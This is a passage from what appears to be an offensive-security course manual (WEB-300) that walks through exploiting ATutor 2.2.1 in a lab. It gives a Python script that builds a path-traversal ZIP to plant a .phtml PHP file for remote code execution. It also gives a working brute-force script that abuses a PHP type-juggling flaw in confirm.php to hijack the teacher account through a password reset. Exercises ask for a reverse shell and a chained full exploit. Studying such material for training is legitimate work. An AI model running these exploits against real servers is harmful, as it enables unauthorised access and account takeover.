GET /ATutor/browse.php?access=&search[]=test&include=all&filter=Filter HTTP/1.1 
Host: target 
Listing 98 - Using array injection into a GET parameter 
Figure 86 clearly shows the disclosure of the full web root path. 
 
Figure 86: The resulting response, disclosing the web root path 
Essentially, all we need to do is cause the application to trigger a PHP warning, which is quite 
common when unexpected user-controlled input is parsed. This allows us to disclose information 
that would otherwise be private, such as the local path of the web root on the host where the 
application is running. 
Now that we know how to find a web root path, we can move on to the next requirement before 
we can gain remote code execution. 
3.9.3 Finding Writable Directories 
In a black box approach, we can find a writable directory by either brute forcing the web 
application paths, or via another information disclosure. However, since we are using a white box 
approach, we can simply search for writable directories within the web root on the command line. 
student@atutor:~$ find /var/www/html/ -type d -perm -o+w 
/var/www/html/ATutor/mods 
... 
Listing 99 - The mods directory is writable along with its child directories 
The ATutor web application uses the mods directory for installation of modules by the 
administrative ATutor user. This implies that it has to be writable by the www-data web user. 
Therefore, we can update our script to use this directory as the target for the traversal attack we 
described in the previous section. 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
112 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', 'offsec') 
    z.writestr('imsmanifest.xml', 'invalid xml!') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 100 - The updated proof of concept creates a ZIP archive with directory traversals to the mods directory 
After uploading the ZIP file generated by our script, we can confirm that we can access our file as 
shown in Figure 87! 
 
Figure 87: Accessing the uploaded file 
That leaves us with only one more hurdle to overcome. 
3.9.4 Bypassing File Extension Filter 
Based on the exercise earlier in this module, it is clear that the ATutor developers did make an 
attempt to prevent the upload of arbitrary PHP files. More specifically, we know that if we include 
any file with the .php extension in our ZIP file, the entire import will fail. 
Fortunately, Apache server can interpret a number of different files and extensions that contain 
PHP code, but before we arbitrarily choose a different extension for our malicious PHP file, we 
need to see how the ATutor developers implemented the file extension filtering. 
If we look at the import_test.php file, we can see the following code: 
178:    /* extract the entire archive into AT_COURSE_CONTENT . import/$course using 
the call back function to filter out php files */ 
179:    error_reporting(0); 
180:    $archive = new PclZip($_FILES['file']['tmp_name']); 
181:    if ($archive->extract(  PCLZIP_OPT_PATH,    $import_path, 
182:                            PCLZIP_CB_PRE_EXTRACT,  'preImportCallBack') == 0) { 
183:        $msg->addError('IMPORT_FAILED'); 
184:        echo 'Error : '.$archive->errorInfo(true); 
185:        clr_dir($import_path); 
186:        header('Location: questin_db.php'); 
187:        exit; 
188:    } 
189:    error_reporting(AT_ERROR_REPORTING); 
Listing 101 - Decompression routine for the uploaded ZIP files 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
113 
A quick look at the code in Listing 101 tells us exactly how the ZIP file extraction process works. 
Specifically, the developer comment itself indicates that the extract function on line 181 is using 
the callback function preImportCallBack to filter out any PHP files from the uploaded archive file. 
The 
implementation 
of 
the 
preImportCallBack 
function 
can 
be 
found 
in 
file 
/var/www/html/ATutor/mods/_core/file_manager/filemanager.inc.php: 
147: /** 
148: * This function gets used by PclZip when creating a zip archive. 
149: * @access  private 
150: * @return  int             whether or not to include the file 
151: * @author  Joel Kronenberg 
152: */ 
153:    function preImportCallBack($p_event, &$p_header) { 
154:        global $IllegalExtentions; 
155:  
156:        if ($p_header['folder'] == 1) { 
157:            return 1; 
158:        } 
159:  
160:        $path_parts = pathinfo($p_header['filename']); 
161:        $ext = $path_parts['extension']; 
162:  
163:        if (in_array($ext, $IllegalExtentions)) { 
164:            return 0; 
165:        } 
166:  
167:        return 1; 
168:    } 
Listing 102 - preImportCallBack implementation 
On line 163 we spot a reference to a $IllegalExtentions array. Its name is rather self-explanatory 
and a quick search leads us to /var/www/html/ATutor/include/lib/constants.inc.php, where we 
find a number of configuration variables, with the most important for our purposes being 
illegal_extensions. 
$_config_defaults['illegal_extentions']        = 
'exe|asp|php|php3|bat|cgi|pl|com|vbs|reg|pcd|pif|scr|bas|inf|vb|vbe|wsc|wsf|wsh'; 
Listing 103 - List of non-allowed extensions 
At this point, all we need to do is pick an extension that is not in the list, yet will still execute PHP 
code when rendered. For the purposes of this exercise, we are going to use the .phtml extension, 
although, other extensions are available to us as well. 
All that remains for us is to update our script so that it generates a proof of concept file with the 
phtml extension, as well as add any PHP code to it. The code we will inject is the following: 
<?php phpinfo(); ?> 
Listing 104 - PHP code that will display a PHP environment information page 
Finally, we can implement our last changes as discussed. 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
114 
 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml', '<?php 
phpinfo(); ?>') 
    z.writestr('imsmanifest.xml', 'invalid xml!') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 105 - The updated proof of concept creates a ZIP archive implementing the entire attack vector 
After running through our entire attack vector, we can see that we have arbitrary PHP code 
execution! 
 
Figure 88: Remote code execution achieved! 
3.9.4.1 Exercises 
1. 
Replay the above attack and gain code execution on your Atutor target 
2. 
Try to gain a reverse shell so that you can interact with the underlying server environment 
3.9.4.2 Extra Mile 
Develop a fully functional exploit that will combine the previous vulnerabilities to achieve remote 
code execution: 
1. 
Use the SQL injection to disclose the teacher’s password hash 
2. 
Log in with the disclosed hash (using the pass the hash vulnerability) 
3. 
Upload a ZIP that contains a PHP file and extract it into the web root 
4. 
Gain remote code execution! 
3.10 Wrapping Up 
In this module, we first discovered and then later exploited a pre-authenticated blind Boolean SQL 
injection vulnerability in the ATutor web application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
115 
We then deeply analyzed the ATutor authentication mechanism and discovered a flaw that, when 
combined with the blind SQL injection, allowed us to gain privileged access to the web 
application. 
Finally, by leveraging this level of access, we discovered and exploited a file upload vulnerability 
that provided us with remote code execution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
116 
3.10.1.1.1 
 
4 ATutor LMS Type Juggling Vulnerability 
This module will cover the in-depth analysis and exploitation of a PHP Type Juggling vulnerability 
identified in ATutor. 
4.1 Getting Started 
In order to access the ATutor server, we have created a hosts file entry named “atutor” in our Kali 
Linux VM. We recommend making this configuration change in your Kali machine to follow along. 
Revert the ATutor virtual machine from your student control panel before starting your work. 
In this module, the ATutor VM needs to be able to send emails so we will be using the Atmail VM 
as a SMTP relay. The ATutor VM already has Postfix installed but will need to be configured with 
the correct IP address of your Atmail VM. In order to modify the Postfix configuration, you will 
need to edit the /etc/postfix/transport file as the root user. 
student@atutor:~$ sudo cat /etc/postfix/transport 
... 
offsec.local    smtp:[192.168.121.106]:587 
... 
Listing 106 - The Postfix transport file on the ATutor VM. Replace 192.168.121.106 with the IP address of your Atmail VM. 
Once you have modified the transport file with the correct IP address, issue the following 
command: 
student@atutor:~$ sudo postmap /etc/postfix/transport 
Listing 107 - Updating the Postfix transport configuration 
At this point, your ATutor VM should be able to send emails to the Atmail VM using the latter as a 
relay server. 
4.2 PHP Loose and Strict Comparisons 
As we saw earlier, ATutor version 2.2.1 contains a few interesting vulnerabilities that were worth 
exploring in depth. Besides the ones we have already discussed, this version of ATutor also 
contains a completely separate vulnerability that can be used to gain privileged access to the web 
application. In this case, the vulnerability revolves around the use of loose comparisons of user-
controlled values, which results in the execution of implicit data type conversions, i.e. type 
juggling.40 Ultimately, this allows us to subvert the application logic and perform protected 
operations from an unauthenticated perspective. 
While type juggling vulnerabilities can arguably be called exotic, the following example will help 
highlight how a lack of language-specific knowledge (in this case PHP), despite the good 
intentions of developers, can sometimes result in exploitable vulnerabilities. 
Before we look at the actual vulnerability, we need to briefly explain why the type juggling PHP 
feature has the potential to cause problems for developers. As the PHP manual states: 
 
40 (PHP Group, 2020), http://php.net/manual/en/language.types.type-juggling.php 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
117 
PHP does not require (or support) explicit type definition in variable declaration; a 
variable’s type is determined by the context in which the variable is used. That is 
to say, if a string value is assigned to variable $var, $var becomes a string. If an 
integer value is then assigned to $var, it becomes an integer. 
While the lack of explicit variable type declaration can be seen as a rather helpful language 
construct, it becomes a difficult road to navigate when the variables are used in comparison 
operations. Specifically, as we will soon illustrate, there are cases where type juggling can lead to 
unintended interpretation by the PHP engine. For this reason, the concept of strict comparisons 
has been introduced in PHP. It is worth noting that software developers with a background in 
different languages tend to use loose comparisons more often due to their lack of familiarity of 
strict comparisons. While strict comparisons compare both the data values and the types 
associated to them, a loose comparison only makes use of context to understand of what type 
the data is. The different operators used for strict and loose comparisons can be found in the 
PHP manual.41 
To better illustrate this point, we can refer to the following PHP type comparison tables when 
loose comparisons (Figure 89) and strict comparisons (Figure 90) are used. As an example, 
notice that when you compare the integer 0 and the string “php” the result is true when the loose 
comparison operator is used. 
 
Figure 89: PHP loose comparisons using “==” 
 
41 (PHP Group, 2020), http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
118 
4.2.1.1.1 
 
As we can see, the logic used for implicit variable type conversions behavior when loose 
comparisons are used is rather confusing. 
 
Figure 90: PHP strict comparisons using “===” 
In order to avoid potential vulnerabilities, developers need to be aware of and use strict operators, 
especially when critical comparisons involve user-controlled values. Nevertheless, that is not 
always the case as we will soon see. 
Before we continue, it is important to note that PHP developers have recognized this as a problem 
and addressed it to an extent in PHP version 7 and later. However, these improvements do not 
completely solve the problem and type juggling vulnerabilities can still occur even in most recent 
versions of PHP. Furthermore, a large number of web servers running PHP5 still exist, which 
makes type juggling vulnerabilities a possible, if not frequent, occurrence. 
4.3 PHP String Conversion to Numbers 
While we briefly addressed loose comparison pitfalls in the previous section in general terms, we 
also need to take a look at the PHP rules for string to integer conversions to make better sense of 
them. Once again, we return to the PHP manual where we can find the following definitions:42 
When a string is evaluated in a numeric context, the resulting value and type are 
determined as follows. 
 
42 (PHP Group, 2020), http://php.net/manual/en/language.types.string.php#language.types.string.conversion 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
119 
If the string does not contain any of the characters ‘.’, ‘e’, or ‘E’ and the numeric 
value fits into integer type limits (as defined by PHP_INT_MAX), the string will be 
evaluated as an integer. In all other cases it will be evaluated as a float. 
The value is given by the initial portion of the string. If the string starts with valid 
numeric data, this will be the value used. Otherwise, the value will be 0 (zero). 
Valid numeric data is an optional sign, followed by one or more digits (optionally 
containing a decimal point), followed by an optional exponent. The exponent is 
an ‘e’ or ‘E’ followed by one or more digits. 
The definitions above are a bit difficult to digest so let’s look at a few examples to illustrate what 
they mean in practice. First, we will log in to our ATutor VM and perform a few loose comparison 
operations. 
student@atutor:~$ php -v 
PHP 5.6.17-0+deb8u1 (cli) (built: Jan 13 2016 09:10:12)  
Copyright (c) 1997-2015 The PHP Group 
Zend Engine v2.6.0, Copyright (c) 1998-2015 Zend Technologies 
    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2015, by Zend Technologies 
 
student@atutor:~$ php -a 
Interactive mode enabled 
 
php > var_dump('0xAAAA' == '43690'); 
bool(true) 
 
php > var_dump('0xAAAA' == 43690); 
bool(true) 
 
php > var_dump(0xAAAA == 43690); 
bool(true) 
 
php > var_dump('0xAAAA' == '43691'); 
bool(false) 
Listing 108 - Loose comparison examples in PHP5 
What we can observe in the listing above is how PHP attempts to perform an implicit string-to-
integer conversion during the loose comparison operation when strings representing 
hexadecimal notation are used. 
If we attempt to do this on our Kali VM, we will get different results. This is because Kali deploys a 
newer version of PHP. Specifically, in PHP7 the implicit conversion rules have been improved in 
order to minimize some of the potential loose comparison problems. 
kali@kali:~$ php -v 
PHP 7.0.27-1 (cli) (built: Jan  5 2018 12:34:37) ( NTS ) 
Copyright (c) 1997-2017 The PHP Group 
Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies 
    with Zend OPcache v7.0.27-1, Copyright (c) 1999-2017, by Zend Technologies 
 
kali@kali:~$ php -a 
Interactive mode enabled 
 
php > var_dump('0xAAAA' == '43690'); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
120 
bool(false) 
 
php > var_dump('0xAAAA' == 43690); 
bool(false) 
 
php > var_dump(0xAAAA == 43690); 
bool(true) 
 
php > var_dump('0xAAAA' == '43691'); 
bool(false) 
Listing 109 - Loose comparison examples in PHP7 
For this module, the part of the conversion rules we are most interested in revolves around the 
scientific exponential number notation. As a very basic example, the PHP manual indicates that 
any time we see a string that starts with any number of digits, followed by the letter “e”, which is 
then followed by any number of digits (and only digits), and this string is used in a numeric 
context (such as comparison to another number), it will be evaluated as a number.43 
Let’s look at this in practice. 
student@atutor:~$ php -a 
Interactive mode enabled 
 
php > var_dump('0eAAAA' == '0'); 
bool(false) 
 
php > var_dump('0e1111' == '0'); 
bool(true) 
 
php > var_dump('0e9999' == 0); 
bool(true) 
Listing 110 - Scientific exponential notation comparisons in PHP5 
Notice that the examples in Listing 110 confirm that the automatic string-to-integer casting is 
working as expected even when the exponential notation is involved. In the last two cases, that 
means the strings will be treated as a zero value, because any number multiplied by zero will 
always be zero. Please note that the results seen in Listing 110 would be identical in PHP7 as 
well, as the interpretation rules for exponent notations have not changed. 
But why does this matter to us? Let’s look at our vulnerability in ATutor and see how we can take 
advantage of loose comparisons when the scientific exponential notation is involved. 
4.3.1.1 Exercise 
On your ATutor VM, experiment with the various type conversion examples in order to reinforce 
the concepts explained in the previous section. 
4.4 Vulnerability Discovery 
In the previous ATutor module, a SQL injection vulnerability, combined with a flawed 
authentication logic implementation, allowed us to gain unauthorized privileged access to the 
 
43 (PHP Group, 2020), http://php.net/manual/en/language.types.string.php#language.types.string.conversion 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
121 
vulnerable ATutor instance. However, that is not the only way that an attacker could use to gain 
the same level of access. An unauthenticated attacker could accomplish the same goal using a 
type juggling vulnerability. Specifically, to exploit this vulnerability, an attacker must reach the 
code segment responsible for user account email address updates located in confirm.php which 
is publicly accessible. 
With that in mind let’s investigate how exactly the ATutor developers implemented this 
functionality. In order to do that, we need to understand the following chunk of code in the 
confirm.php file. 
25: if (isset($_GET['e'], $_GET['id'], $_GET['m'])) { 
26:     $id = intval($_GET['id']); 
27:     $m  = $_GET['m']; 
28:     $e  = $addslashes($_GET['e']); 
29:   
30:   $sql    = "SELECT creation_date FROM %smembers WHERE member_id=%d"; 
31:     $row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE); 
32:      
33:     if ($row['creation_date'] != '') { 
... 
Listing 111 - Partial implementation of the email update logic 
We start on line 25, where we see that the GET request variables e, id, and m need to be set in 
order for us to enter this code branch. These values are then set to their respective local 
variables. Notice on line 28 the use of the $addslashes function, which you will recall from the 
previous ATutor module. As in the previous case, $addslashes effectively resolves to the trim 
function and therefore is not sanitizing any input here. 
Lines 30-31 then perform a SQL query which uses the user-controlled id value passed in the GET 
request. Notice however that this value is typecast to an integer and that the query is also 
properly parameterized. Therefore, we do not have an SQL injection at this point even if 
$addslashes is not properly sanitizing user input. Furthermore, the check on line 33 stipulates that 
the id value has to correspond to an existing entry in the database. This makes sense, as the code 
portion we are studying is supposed to update a valid user’s email address. 
Before we continue, let’s take a quick look at the ATutor database table involved in the above SQL 
query. 
mysql> select member_id, login, creation_date from AT_members; 
+-----------+---------+---------------------+ 
| member_id | login   | creation_date       | 
+-----------+---------+---------------------+ 
|         1 | teacher | 2018-05-10 19:28:05 | 
+-----------+---------+---------------------+ 
1 row in set (0.01 sec) 
Listing 112 - AT_members table contents 
In Listing 112, we find that our database contains one entry. Therefore, in our example we will 
target the “teacher” account with the member_id of 1. 
If we pass the account ID with the value 1 in the GET request, the query from Listing 111 will 
return a single row and the creation_date array entry will be populated. This should let us pass the 
check on line 33 and arrive on line 34 (Listing 113). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
122 
4.4.1.1.1 
 
33:     if ($row['creation_date'] != '') { 
34:         $code = substr(md5($e . $row['creation_date'] . $id), 0, 10); 
35:         if ($code == $m) { 
36:             $sql = "UPDATE %smembers SET email='%s', last_login=NOW(), 
creation_date=creation_date WHERE member_id=%d"; 
37:             $result = queryDB($sql, array(TABLE_PREFIX, $e, $id)); 
38:             $msg->addFeedback('CONFIRM_GOOD'); 
39:  
40:             header('Location: '.$_base_href.'users/index.php'); 
41:             exit; 
42:         } else { 
43:             $msg->addError('CONFIRM_BAD'); 
44:         } 
45:     } else { 
46:         $msg->addError('CONFIRM_BAD'); 
47:     } 
Listing 113 - Continuation of the email update logic implementation 
Here, the variable called $code is initialized with the MD5 hash of the concatenated string 
consisting of two values we control ($e and $id) and the creation date entry returned from the 
database by the previously analyzed SELECT query (line 30 Listing 111). More importantly, only 
the first 10 characters of the MD5 hash are assigned to the $code variable. This will be rather 
helpful as we will see shortly. 
Finally, and critically, on line 35 we see a loose comparison using a value that we fully control, 
namely $m and one we partially control, $code. If we find a way to enter this branch, we would 
then be able to update the target account email as seen on lines 37-38, and would be redirected 
to the target user’s profile page (PHP header function on line 40). 
To recap what we know so far, confirm.php does not require authentication and can be used to 
change the email of an existing user. We also know from the previous analysis that in the code 
logic to update an existing user email address: 
• 
the $id GET variable corresponds to the unique ID value assigned to each ATutor user in the 
database and is under attacker control 
• 
the $e GET variable corresponds to the new email address we would like to set and is under 
attacker control 
• 
the attacker controlled $m GET variable is used to decide if we are allowed to update the 
email address for the target user based on a loose comparison against the calculated $code 
variable 
• 
the $code variable is a ten characters MD5 hash substring partially under attacker control 
Let’s now figure out how we can exploit this loose comparison. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
123 
4.4.1.1.2 
 
4.5 Attacking the Loose Comparison 
At this point in our analysis, we should be recalling what we have learned about PHP and 
scientific exponent notation from the previous section. The question though is: what is the 
practical value of this knowledge from the perspective of an attacker? For that, we need to 
expand the explored concepts a bit further and introduce the topic of Magic Hashes. 
4.5.1 Magic Hashes 
It turns out that loose comparisons can play a significant role when they are used in conjunction 
with hash values such as MD5 or SHA1. This concept has been explored by a number of 
researchers in the past and we encourage you to read more about it.44 
In essence, we have to consider that the hexadecimal character space used for the 
representation of various hash types is [a-fA-F0-9]. This implies that it may be possible to discover 
a plain-text value whose MD5 hash conforms to the format of scientific exponent notation. In the 
case of MD5, that is indeed true and the specific string was discovered by Michal Spacek. 
student@atutor:~$ php -a 
Interactive mode enabled 
 
php > echo md5('240610708'); 
0e462097431906509019562988736854 
 
php > var_dump('0e462097431906509019562988736854' == '0'); 
bool(true) 
Listing 114 - MD5 Magic Hash 
The MD5 of this particular string (Listing 114) translates to a valid number formatted in the 
scientific exponential notation, and its value evaluates to zero. This example once again validates 
that the implicit string-to-integer conversion rules are working as expected, similar to what we 
described earlier in this module. 
Even if the implications of this magic hash may not be clear yet, we can start to see how things 
could go wrong in cases where an attacker-controlled value is hashed using MD5 first and then 
processed using loose comparisons. In some of those instances the code logic may indeed be 
subverted due to the unexpected numerical evaluation of the hash. 
Please note that although there exists only one known MD5 hash that falls into the scientific 
notation category relative to how PHP interprets strings, this is not an insurmountable hurdle for 
us. Once again, the reason lies in the fact that the ATutor developers use only a 10 character 
substring of a full MD5 hash, leaving us with a sufficiently large keyspace to operate in. 
Before moving on to our specific case and figuring out if there’s a way to craft a similar Magic 
Hash to abuse our loose comparison, it’s worth mentioning that further research has shown that 
similar magic hashes are present in other hashing types as well.45 
 
44 (WhiteHat Security, Inc., 2011), https://www.whitehatsec.com/blog/magic-hashes/ 
45 (WhiteHat Security, Inc., 2011), https://www.whitehatsec.com/blog/magic-hashes/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
124 
4.5.2 ATutor and the Magic E-Mail address 
From our brief discussion in the previous section, we know that if we could fully control the $code 
variable so that it takes the form of a Magic Hash, we would be able to trivially bypass the check 
on line 35 in Listing 113. This is true as we have full control over the m variable, which we could 
set to zero or the appropriate numerical value, depending on the obtained magic hash. 
However, that is not quite the case as we have already seen. Nevertheless, this doesn’t mean that 
we have hit a dead end, but rather that we have to use a brute force approach. Although that does 
not sound elegant, it is quite effective in this case due to the fact that the unique code consists of 
only the first 10 characters of an MD5 hash. 
Let’s quickly review the code generation logic: 
$code = substr(md5($e . $row['creation_date'] . $id), 0, 10); 
Listing 115 - The confirmation code generation logic 
Based on the listing above, we can deduce that in our brute force approach the only value that we 
can change on each iteration is the $e variable. This is the new email address that we provide for 
the target user. The account creation date is pulled from the database and should be static. 
Similarly, the account ID needs to stay static as well, since we are targeting a single account. 
This means that we can write a script that generates all possible combinations of an email 
username, within the length limit we specify, and try to find an instance where the 10 character 
MD5 substring ($code variable) has the value 0eDDDDDDDD where “D” is a digit. 
Again, if such a Magic Hash is found it will allow us to defeat the vulnerable loose comparison as 
we can set $m to zero in our GET request. The critical check between $code and $m will then look 
like the following: 
if (0eDDDDDDDD == 0) 
  UPDATE THE EMAIL ADDRESS 
Listing 116 - Pseudo-code for the loose comparison between $code=0eDDDDDDDD and $m=0 
As a reminder, this is the code chunk in question in confirm.php: 
if ($code == $m) { 
        $sql = "UPDATE %smembers SET email='%s', last_login=NOW(), 
creation_date=creation_date WHERE member_id=%d"; 
        $result = queryDB($sql, array(TABLE_PREFIX, $e, $id)); 
Listing 117 - If the confirmation code is correct, the email address will be updated 
Since 0eDDDDDDDD will evaluate to zero, we will be able to enter the if block from the listing 
above and update the account email address to the random address generated by our brute force 
attack. 
Lastly, in order for this attack vector to succeed, we need the ability to generate an arbitrary email 
account for a domain we control once we find a valid Magic Email address. This is necessary 
because once we update the account email address, we can use the “Forgot your password” 
feature to have a password reset email sent to that address. This will ultimately allow us to hijack 
the targeted account. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
125 
In order to better understand this approach, we will first recreate the code generation logic on our 
Kali VM using Python. The script takes a domain name, target account ID, a creation date, and the 
character length of the email prefix as parameters. Based on that information, it generates all 
possible combinations of the email address using only the alpha character set and performs the 
MD5 operation on the concatenated string. If the 10 character substring matches the criteria we 
previously discussed, it marks it as a valid email address. The following code will do that for us. 
import hashlib, string, itertools, re, sys 
 
def gen_code(domain, id, date, prefix_length): 
    count = 0 
    for word in itertools.imap(''.join, itertools.product(string.lowercase, 
repeat=int(prefix_length))): 
        hash = hashlib.md5("%s@%s" % (word, domain) + date + id).hexdigest()[:10] 
        if re.match(r'0+[eE]\d+$', hash): 
            print "(+) Found a valid email! %s@%s" % (word, domain) 
            print "(+) Requests made: %d" % count 
            print "(+) Equivalent loose comparison: %s == 0\n" % (hash) 
        count += 1 
 
def main(): 
    if len(sys.argv) != 5: 
        print '(+) usage: %s <domain_name> <id> <creation_date> <prefix_length>' % 
sys.argv[0] 
        print '(+) eg: %s offsec.local 3 "2018-06-10 23:59:59" 3'  % sys.argv[0] 
        sys.exit(-1) 
 
    domain = sys.argv[1] 
    id = sys.argv[2] 
    creation_date  = sys.argv[3] 
    prefix_length = sys.argv[4] 
 
    gen_code(domain, id, creation_date, prefix_length) 
 
if __name__ == "__main__": 
    main() 
Listing 118 - Brute force code generation simulator 
Let’s take a look at this in action. Notice that we will use the real creation date for our target 
account in order to validate our process and demonstrate that the brute force approach can be 
successful relatively quickly. However, knowledge of the real account creation date is not required 
for our attack. It would be provided by the server itself during the validation process, as it happens 
on the server and not client-side. 
kali@kali:~/atutor$ python atutor_codegen.py offsec.local 1 "2018-05-10 19:28:05" 3 
(+) Found a valid email! axt@offsec.local 
(+) Requests made: 617 
(+) Equivalent loose comparison: 0e77973356 == 0 
 
kali@kali:~/atutor$ python atutor_codegen.py offsec.local 1 "2018-05-10 19:28:05" 4 
(+) Found a valid email! avlz@offsec.local 
(+) Requests made: 14507 
(+) Equivalent loose comparison: 0e35045908 == 0 
 
(+) Found a valid email! bolf@offsec.local 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
126 
(+) Requests made: 27331 
(+) Equivalent loose comparison: 00e8691400 == 0 
 
(+) Found a valid email! brso@offsec.local 
(+) Requests made: 29550 
(+) Equivalent loose comparison: 00e5718309 == 0 
... 
Listing 119 - A sample run of the brute force script 
For the purposes of this exercise, we will use our Atmail VM and the first valid email address we 
discovered using our script, namely axt@offsec.local. 
 
Figure 91: Creation of an arbitrary valid email account in Atmail 
We can now modify our previous script to include the proper GET request that will execute our 
attack once the first Magic Email address is found. 
import hashlib, string, itertools, re, sys, requests 
 
def update_email(ip, domain, id, prefix_length): 
    count = 0 
    for word in itertools.imap(''.join, itertools.product(string.lowercase, 
repeat=int(prefix_length))): 
        email = "%s@%s" % (word, domain) 
        url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % (ip, email, id) 
          print "(*) Issuing update request to URL: %s" % url 
        r = requests.get(url, allow_redirects=False) 
        if (r.status_code == 302): 
            return (True, email, count) 
        else: 
            count += 1 
    return (False, Nothing, count) 
 
def main(): 
    if len(sys.argv) != 5: 
        print '(+) usage: %s <domain_name> <id> <prefix_length> <atutor_ip>' % 
sys.argv[0] 
        print '(+) eg: %s offsec.local 1 3 192.168.1.2'  % sys.argv[0] 
        sys.exit(-1) 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
127 
    domain = sys.argv[1] 
    id = sys.argv[2] 
    prefix_length = sys.argv[3] 
    ip = sys.argv[4] 
 
    result, email, c = update_email(ip, domain, id, prefix_length) 
    if(result): 
        print "(+) Account hijacked with email %s using %d requests!" % (email, c) 
    else: 
        print "(-) Account hijacking failed!" 
 
if __name__ == "__main__": 
    main() 
Listing 120 - The brute force script will issue the proper GET request once a valid email address is found 
Please note that in the above script we are using the 302 status code as our positive attack result 
indicator because we saw in Listing 113 that a user account email update is followed by a redirect 
to the relative user profile page. 
Before we execute our code, let’s check the Atutor user admin section to make sure that the 
current email address for our target “teacher” account is “teacher@example.com”. 
 
Figure 92: Target ATutor account has not been hijacked yet 
We can now execute our modified script and see if we can hijack the account. 
kali@kali:~/atutor$ python atutor_update_email.py offsec.local 1 3 192.168.121.103 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=aaa@offsec.local&m=0&id=1 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=aab@offsec.local&m=0&id=1 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=aac@offsec.local&m=0&id=1 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=aad@offsec.local&m=0&id=1 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=aae@offsec.local&m=0&id=1 
... 
... 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=axs@offsec.local&m=0&id=1 
(*) Issuing update request to URL: 
http://192.168.121.103/ATutor/confirm.php?e=axt@offsec.local&m=0&id=1 
(+) Account hijacked with email axt@offsec.local using 617 requests! 
Listing 121 - Teacher account has been updated with a new email address 
A quick look at the ATutor user admin section can verify the success of our attack. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
128 
 
Figure 93: Validation of the successfull ATutor account hijack 
All that is left to do is to request a password reset using our new email address for the teacher 
account and we will have successfully gained unauthorized privileged access to ATutor once we 
reset the password. 
 
Figure 94: Requesting the password reset using the updated “teacher” email address 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
129 
4.5.2.1.1 
 
 
Figure 95: A password reset URL is sent to an attacker-controlled email account 
After gaining privileged access, we could execute the same file upload attack as we did in the 
previous ATutor module and gain OS-level unauthorized access. As a quick reminder, we would 
use a malicious ZIP file that we would upload using the Tests and Surveys functionality. The ZIP 
file would use a directory traversal technique to reach a publicly accessible ATutor directory in 
which a malicious PHP file would be written, thus gaining remote code execution. 
 
Figure 96: Remote code execution on a vulnerable ATutor instance 
4.5.2.2 Exercise 
